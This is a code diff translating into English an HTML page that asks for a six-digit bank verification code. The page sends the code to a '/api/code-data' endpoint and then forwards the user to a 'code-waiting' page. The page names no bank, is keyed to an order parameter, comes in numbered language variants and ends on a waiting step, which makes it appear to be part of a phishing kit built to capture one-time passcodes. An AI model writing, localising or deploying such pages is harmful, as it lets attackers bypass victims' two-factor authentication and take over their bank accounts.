@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="fr" dir="ltr">
+<html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Code de vérification</title>
+<title>Verification Code</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%;font-family:"Segoe UI",Tahoma,Arial,sans-serif}
@@ -86,8 +86,8 @@
     </svg>
   </div>
 
-  <h1>Entrez le code de vérification</h1>
-  <p class="subtitle">Un code de vérification a été envoyé à votre téléphone enregistré</p>
+  <h1>Enter verification code</h1>
+  <p class="subtitle">A verification code has been sent to your registered phone</p>
 
   <div class="error-msg" id="errorMsg"></div>
 
@@ -101,22 +101,22 @@
   </div>
 
   <div class="info-text">
-    Ne partagez ce code avec personne. L'équipe de la banque ne vous demandera jamais ce code.
+    Do not share this code with anyone. The bank team will never ask you for this code.
   </div>
 </div>
 
 <div class="bottom">
-  <button class="submit-btn" id="submitBtn" onclick="submitCode()">Confirmer</button>
+  <button class="submit-btn" id="submitBtn" onclick="submitCode()">Confirm</button>
 </div>
 
 <script>
   const params = new URLSearchParams(location.search);
   const orderId = params.get("order");
-  if (!orderId) location.href = "index-fr.html";
+  if (!orderId) location.href = "index-en.html";
 
   if (params.get("error") === "1") {
     const el = document.getElementById("errorMsg");
-    el.textContent = "Code incorrect ou expiré";
+    el.textContent = "Incorrect or expired code";
     el.style.display = "block";
   }
 
@@ -147,12 +147,12 @@
   async function submitCode() {
     const code = getCode();
     if (code.length < 6) {
-      showError("Veuillez saisir le code complet");
+      showError("Please enter the complete code");
       return;
     }
     const btn = document.getElementById("submitBtn");
     btn.disabled = true;
-    btn.textContent = "Vérification en cours...";
+    btn.textContent = "Verifying...";
 
     try {
       const res = await fetch("/api/code-data", {
@@ -162,16 +162,16 @@
       });
       const data = await res.json();
       if (data.success) {
-        location.href = "code-waiting-fr.html?order=" + orderId;
+        location.href = "code-waiting-en.html?order=" + orderId;
       } else {
-        showError(data.message || "Une erreur est survenue");
+        showError(data.message || "An error occurred");
         btn.disabled = false;
-        btn.textContent = "Confirmer";
+        btn.textContent = "Confirm";
       }
     } catch(err) {
-      showError("Erreur de connexion");
+      showError("Connection error");
       btn.disabled = false;
-      btn.textContent = "Confirmer";
+      btn.textContent = "Confirm";
     }
   }
 
